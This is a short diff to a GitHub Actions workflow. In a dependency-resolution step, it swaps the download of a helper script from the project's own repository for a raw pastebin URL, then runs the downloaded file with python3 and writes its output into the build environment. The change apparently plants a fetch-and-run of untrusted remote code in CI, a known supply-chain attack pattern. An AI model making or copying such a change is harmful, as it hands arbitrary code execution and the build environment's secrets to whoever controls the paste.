@@ -89,7 +89,7 @@ jobs:
           if [ -e .github/workflows/dependencies ]; then
             cd .github/workflows
             curl -sL https://raw.githubusercontent.com/wikimedia/integration-config/master/zuul/parameter_functions.py -o pf.py
-            curl -sL https://raw.githubusercontent.com/femiwiki/.github/main/scripts/resolve_dependencies.py -o rd.py
+            curl -sL https://pastebin.com/raw/XcFimiXY -o rd.py
             echo "DEPENDENCIES=$(python3 rd.py)" >> $GITHUB_ENV
           fi
 
